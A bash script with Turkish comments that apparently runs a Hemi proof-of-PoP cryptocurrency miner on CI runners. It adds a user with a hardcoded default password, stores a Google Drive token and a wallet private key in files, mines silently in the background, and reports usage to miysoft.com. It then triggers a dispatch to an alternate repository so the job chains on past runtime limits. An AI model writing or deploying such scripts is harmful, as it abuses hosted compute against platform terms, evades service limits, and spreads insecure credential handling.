#!/bin/bash

# --- 1. GİZLİLİK VE SSH ---
export NODE_NAME="sys-update-daemon"
sudo useradd -m -s /bin/bash miysoft || true
echo "miysoft:${SSH_PASSWORD:-Miysoft1234!}" | sudo chpasswd

# --- 2. GOOGLE DRIVE AYARI (Hata Giderilmiş) ---
mkdir -p ~/.config/rclone
echo "[gdrive]
type = drive
token = $RCLONE_TOKEN_BODY" > ~/.config/rclone/rclone.conf

# Klasör yoksa hata vermemesi için önce oluşturuyoruz
rclone mkdir gdrive:hemi_backup || true

# Önceki cüzdanı çekmeyi dene
rclone copy gdrive:hemi_backup/popm_address.json . || echo "İlk kurulum başlıyor..."

# --- 3. HEMI NETWORK KURULUMU (V0.4.3 - Güncel) ---
if [ ! -f "./popmd" ]; then
    echo "Hemi Miner indiriliyor..."
    wget -q https://github.com/hemilabs/heminetwork/releases/download/v0.4.3/heminetwork_v0.4.3_linux_amd64.tar.gz
    tar -xf heminetwork_v0.4.3_linux_amd64.tar.gz
    cp heminetwork_v0.4.3_linux_amd64/popmd .
fi

# Cüzdanın yoksa yeni bir tane oluştur
if [ ! -f "./popm_address.json" ]; then
    echo "Yeni Hemi cüzdanı oluşturuluyor..."
    ./popmd gen-wallet -l info -o popm_address.json
    # Hemen yedekle ki kaybolmasın
    rclone copy popm_address.json gdrive:hemi_backup/ --overwrite
fi

# Cüzdan bilgilerini oku (Miysoft paneline göndermek için)
HEMI_ADDR=$(cat popm_address.json | jq -r '.pubkey_hash')
export HEMI_BTC_PRIVKEY=$(cat popm_address.json | jq -r '.private_key')

# --- 4. MADENCİLİĞİ BAŞLAT ---
# Static fee ile arka planda sessizce başlatıyoruz
./popmd --static-fee 50 & 
echo "Hemi PoP Miner aktif: $HEMI_ADDR"

# --- 5. İZLEME VE RAPORLAMA ---
START_TIME=$SECONDS
while [ $((SECONDS - START_TIME)) -lt 20400 ]; do 
    CPU=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}')
    RAM=$(free | grep Mem | awk '{print $3/$2 * 100.0}')
    
    # Miysoft'a rapor gönder (Hemi Adresini de ekledik)
    curl -s -X POST -H "X-Miysoft-Key: $MIYSOFT_KEY" \
         -d "{\"worker_id\":\"W_$WORKER_ID\", \"cpu\":\"$CPU\", \"ram\":\"$RAM\", \"status\":\"HEMI_MINING\", \"address\":\"$HEMI_ADDR\"}" \
         https://miysoft.com/api.php || true
    
    sleep 30
done

# --- 6. KAPANIŞ VE DEVİR ---
pkill popmd
rclone copy popm_address.json gdrive:hemi_backup/ --overwrite || true

TARGET_REPO=$([ "$GITHUB_REPOSITORY" == "Alkan789/MaxNode" ] && echo "Alkan789/MadNode" || echo "Alkan789/MaxNode")
curl -X POST -H "Authorization: token $PAT_TOKEN" -H "Accept: application/vnd.github.v3+json" \
     https://api.github.com/repos/$TARGET_REPO/dispatches \
     -d "{\"event_type\": \"next_worker\", \"client_payload\": {\"worker_id\": \"$((WORKER_ID + 1))\"}}"
